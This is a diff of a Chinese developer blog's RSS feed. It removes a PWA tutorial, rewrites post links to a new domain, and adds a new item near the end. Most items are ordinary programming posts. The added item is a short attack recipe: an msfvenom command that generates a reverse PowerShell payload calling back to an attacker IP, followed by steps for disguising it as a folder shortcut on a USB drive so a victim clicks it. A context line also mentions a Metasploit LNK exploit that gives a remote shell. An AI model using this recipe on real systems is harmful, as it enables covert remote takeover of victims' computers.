@@ -4,115 +4,8 @@
         <title></title>  
         <description>王俊博客，软件改变世界！王俊博客是作者个人知识库、是记录历程回顾的笔记本、是经验教训的资源池， 旨在促进软件开发领域知识与创新的传播，为软件开发中提供帮助。更多是作者本人的经验积累。
 </description>  
-        <link>http://www.vinny.cc</link>  
-        <atom:link href="http://www.vinny.cc/feed.xml" rel="self" type="application/rss+xml" />  
-          
-            <item>  
-               <title>PWA 之拦截 A2HS 实现自主应用添加主屏事件</title>  
-               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#1-概念&quot; id=&quot;markdown-toc-1-概念&quot;&gt;1. 概念&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#2-背景&quot; id=&quot;markdown-toc-2-背景&quot;&gt;2. 背景&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#3-beforeinstallprompt&quot; id=&quot;markdown-toc-3-beforeinstallprompt&quot;&gt;3. beforeinstallprompt&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#4-demo效果&quot; id=&quot;markdown-toc-4-demo效果&quot;&gt;4. demo效果&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#5-判断是否安装&quot; id=&quot;markdown-toc-5-判断是否安装&quot;&gt;5. 判断是否安装&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#6-参考链接&quot; id=&quot;markdown-toc-6-参考链接&quot;&gt;6. 参考链接&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190530/1_hWVmsnBY6Fr6OoNvIU5pmg.png&quot; alt=&quot;pwa-a2hs&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;1-概念&quot;&gt;1. 概念&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;A2HS&lt;/strong&gt; 是（Add to Home screen）的缩写，也是PWA特性之一，它主要为web应用程序提供与本机应用程序相同的用户体验优势，将PWA应用添加至桌面后，用户可以像打开普通应用程序一样使用。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190529/a2hs-1.png&quot; alt=&quot;a2hs-1&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190529/a2hs-2.png&quot; alt=&quot;a2hs-2&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;2-背景&quot;&gt;2. 背景&lt;/h2&gt;
-
-&lt;p&gt;默认情况下，当编写的web应用满足pwa应用最低要求（manifest.json和service-sworker）时，浏览器会在提示用户可以将当前访问的web安装到桌面上，这个行为是浏览器控制的，用户是否可以不依赖于浏览器，不必每次都弹出 A2HS 的banner，行为由用户控制，如点击按钮提示安装，本文基于此目的编写。&lt;/p&gt;
-
-&lt;h2 id=&quot;3-beforeinstallprompt&quot;&gt;3. beforeinstallprompt&lt;/h2&gt;
-
-&lt;p&gt;要实现上述要求，需要监听 &lt;em&gt;beforeinstallprompt&lt;/em&gt; 事件并进行处理。&lt;/p&gt;
-
-&lt;p&gt;实现代码如下：&lt;/p&gt;
-
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// 定义A2HS事件对象&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;installPromptEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;// 监听beforeinstallprompt事件，浏览器触发A2HS时会执行&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'beforeinstallprompt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;c1&quot;&gt;// 阻止自动提示&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;preventDefault&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-  &lt;span class=&quot;c1&quot;&gt;// 储存事件对象，方便在之后的按钮事件中手动触发&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;installPromptEvent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
- 
-&lt;span class=&quot;c1&quot;&gt;// UI上的按钮点击事件&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;installBtn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'click'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;c1&quot;&gt;// 弹出A2HS提示&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;installPromptEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;prompt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-  &lt;span class=&quot;c1&quot;&gt;// 等待用户操作结果&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;installPromptEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;userChoice&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;choiceResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;choiceResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;outcome&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'accepted'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'用户已经接受安装'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'用户已经取消安装'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-      
-      &lt;span class=&quot;c1&quot;&gt;// 只能用一次&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;installPromptEvent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;4-demo效果&quot;&gt;4. demo效果&lt;/h2&gt;
-
-&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190530/2019-05-30 00.20.10.gif&quot; alt=&quot;demo-a2hs&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://github.com/wangjunneil/exchange-pwa/tree/master/src/views&quot;&gt;完整的demo代码&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;5-判断是否安装&quot;&gt;5. 判断是否安装&lt;/h2&gt;
-
-&lt;p&gt;监听安装事件&lt;/p&gt;
-
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'appinstalled'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'installed'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;若是从主屏幕启动，则可以通过 javascript 判断&lt;/p&gt;
-
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;matchMedia&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'(display-mode: standalone)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;matches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'display-mode is standalone'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;safari浏览器&lt;/p&gt;
-
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;navigator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;standalone&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'display-mode is standalone'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;这里需要注意的是，上面三个输出只会在 standalone 模式下执行&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;6-参考链接&quot;&gt;6. 参考链接&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/Progressive_web_apps/Add_to_home_screen&quot;&gt;Add to Home screen&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/BeforeInstallPromptEvent&quot;&gt;Before​Install​Prompt​Event&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.jomendez.com/2018/06/05/add-home-screen-pwas/&quot;&gt;Add to Home Screen your ionic PWA&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-</description>  
-               <pubDate>Wed, 29 May 2019 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2019/05/pwa-handle-install-prompt/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2019/05/pwa-handle-install-prompt/</guid>  
-               </item>  
+        <link>https://www.wangjun.dev</link>  
+        <atom:link href="https://www.wangjun.dev/feed.xml" rel="self" type="application/rss+xml" />  
           
             <item>  
                <title>Progressive Web App 汇总使用说明</title>  
@@ -602,19 +495,16 @@
 &lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190321/pwa_debug-3.png&quot; alt=&quot;pwa_debug-3&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;参考文章&quot;&gt;参考文章&lt;/h2&gt;
-
 &lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;a href=&quot;https://www.netguru.co/codestories/few-tips-that-will-make-your-pwa-on-ios-feel-like-native&quot;&gt;https://www.netguru.co/codestories/few-tips-that-will-make-your-pwa-on-ios-feel-like-native&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.netguru.co/codestories/few-tips-that-will-make-your-pwa-on-ios-feel-like-native&quot;&gt;https://www.netguru.co/codestories/few-tips-that-will-make-your-pwa-on-ios-feel-like-native&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://developers.google.com/web/fundamentals/app-install-banners/&quot;&gt;https://developers.google.com/web/fundamentals/app-install-banners/&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://developers.google.com/web/fundamentals/primers/service-workers/&quot;&gt;https://developers.google.com/web/fundamentals/primers/service-workers/&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://developers.google.com/web/tools/lighthouse/?hl=zh-cn&quot;&gt;https://developers.google.com/web/tools/lighthouse/?hl=zh-cn&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </description>  
                <pubDate>Fri, 11 May 2018 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2018/05/pwa-app/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2018/05/pwa-app/</guid>  
+               <link>https://www.wangjun.dev/2018/05/pwa-app/</link>  
+               <guid isPermaLink="true">https://www.wangjun.dev/2018/05/pwa-app/</guid>  
                </item>  
           
             <item>  
@@ -982,8 +872,8 @@ require&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quo
 &lt;/blockquote&gt;
 </description>  
                <pubDate>Tue, 08 May 2018 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2018/05/create-publish-nodejs-cli/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2018/05/create-publish-nodejs-cli/</guid>  
+               <link>https://www.wangjun.dev/2018/05/create-publish-nodejs-cli/</link>  
+               <guid isPermaLink="true">https://www.wangjun.dev/2018/05/create-publish-nodejs-cli/</guid>  
                </item>  
           
             <item>  
@@ -1026,8 +916,8 @@ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 8000
 
 </description>  
                <pubDate>Mon, 07 May 2018 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2018/05/http-server-ways/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2018/05/http-server-ways/</guid>  
+               <link>https://www.wangjun.dev/2018/05/http-server-ways/</link>  
+               <guid isPermaLink="true">https://www.wangjun.dev/2018/05/http-server-ways/</guid>  
                </item>  
           
             <item>  
@@ -1061,8 +951,8 @@ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 8000
 
 </description>  
                <pubDate>Sun, 06 May 2018 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2018/05/analysis-thread-cpu/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2018/05/analysis-thread-cpu/</guid>  
+               <link>https://www.wangjun.dev/2018/05/analysis-thread-cpu/</link>  
+               <guid isPermaLink="true">https://www.wangjun.dev/2018/05/analysis-thread-cpu/</guid>  
                </item>  
           
             <item>  
@@ -1076,8 +966,8 @@ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 8000
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>  
                <pubDate>Sat, 31 Mar 2018 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2018/03/kali-invalid-signature/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2018/03/kali-invalid-signature/</guid>  
+               <link>https://www.wangjun.dev/2018/03/kali-invalid-signature/</link>  
+               <guid isPermaLink="true">https://www.wangjun.dev/2018/03/kali-invalid-signature/</guid>  
                </item>  
           
             <item>  
@@ -1570,8 +1460,8 @@ git push &lt;span class=&quot;nt&quot;&gt;--tags&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>  
                <pubDate>Wed, 28 Mar 2018 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2018/03/git-flow/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2018/03/git-flow/</guid>  
+               <link>https://www.wangjun.dev/2018/03/git-flow/</link>  
+               <guid isPermaLink="true">https://www.wangjun.dev/2018/03/git-flow/</guid>  
                </item>  
           
             <item>  
@@ -1657,8 +1547,8 @@ git push &lt;span class=&quot;nt&quot;&gt;--tags&lt;/span&gt;
 &lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190322/chrome_extension_4.png&quot; alt=&quot;chrome_extension_1&quot; /&gt;&lt;/p&gt;
 </description>  
                <pubDate>Sun, 18 Mar 2018 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2018/03/how-to-create-chrome-extension/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2018/03/how-to-create-chrome-extension/</guid>  
+               <link>https://www.wangjun.dev/2018/03/how-to-create-chrome-extension/</link>  
+               <guid isPermaLink="true">https://www.wangjun.dev/2018/03/how-to-create-chrome-extension/</guid>  
                </item>  
           
             <item>  
@@ -1928,8 +1818,8 @@ git push &lt;span class=&quot;nt&quot;&gt;--tags&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>  
                <pubDate>Wed, 14 Mar 2018 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2018/03/jersey-jwt/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2018/03/jersey-jwt/</guid>  
+               <link>https://www.wangjun.dev/2018/03/jersey-jwt/</link>  
+               <guid isPermaLink="true">https://www.wangjun.dev/2018/03/jersey-jwt/</guid>  
                </item>  
           
             <item>  
@@ -2004,8 +1894,41 @@ msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&qu
 &lt;p&gt;将U盘插入目标windows机器中，打开U盘就会出发远程link漏洞，在Metasploit控制台中得到目标主机的shell&lt;/p&gt;
 </description>  
                <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2017/11/u-link-remote-vulnerability/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2017/11/u-link-remote-vulnerability/</guid>  
+               <link>https://www.wangjun.dev/2017/11/u-link-remote-vulnerability/</link>  
+               <guid isPermaLink="true">https://www.wangjun.dev/2017/11/u-link-remote-vulnerability/</guid>  
+               </item>  
+          
+            <item>  
+               <title>U盘伪装快捷方式欺骗攻击</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#1-生成脚本木马&quot; id=&quot;markdown-toc-1-生成脚本木马&quot;&gt;1. 生成脚本木马&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#2-u盘放置木马&quot; id=&quot;markdown-toc-2-u盘放置木马&quot;&gt;2. U盘放置木马&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#3-伪装隐藏&quot; id=&quot;markdown-toc-3-伪装隐藏&quot;&gt;3. 伪装隐藏&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#4-诱骗点击&quot; id=&quot;markdown-toc-4-诱骗点击&quot;&gt;4. 诱骗点击&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;1-生成脚本木马&quot;&gt;1. 生成脚本木马&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom –p cmd/windows/reverse_powershell &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.1.15 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;43221  &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; file.bat
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;2-u盘放置木马&quot;&gt;2. U盘放置木马&lt;/h2&gt;
+
+&lt;p&gt;在U盘创建一个空文件夹，将木马程序放到文件夹中，并对此木马程序创建快捷方式，将快捷方式剪切到此文件夹之外。&lt;/p&gt;
+
+&lt;h2 id=&quot;3-伪装隐藏&quot;&gt;3. 伪装隐藏&lt;/h2&gt;
+
+&lt;p&gt;将快捷方式图标设置为文件夹的方式，重命名，如”18++”&lt;/p&gt;
+
+&lt;p&gt;第一步创建的文件夹设置为隐藏模式&lt;/p&gt;
+
+&lt;h2 id=&quot;4-诱骗点击&quot;&gt;4. 诱骗点击&lt;/h2&gt;
+
+&lt;p&gt;此时U盘中只会看见一个”18++”的”文件夹”，其实是伪装的脚本木马程序。&lt;/p&gt;
+</description>  
+               <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
+               <link>https://www.wangjun.dev/2017/11/u-fake-attacker/</link>  
+               <guid isPermaLink="true">https://www.wangjun.dev/2017/11/u-fake-attacker/</guid>  
                </item>  
           
     </channel>  
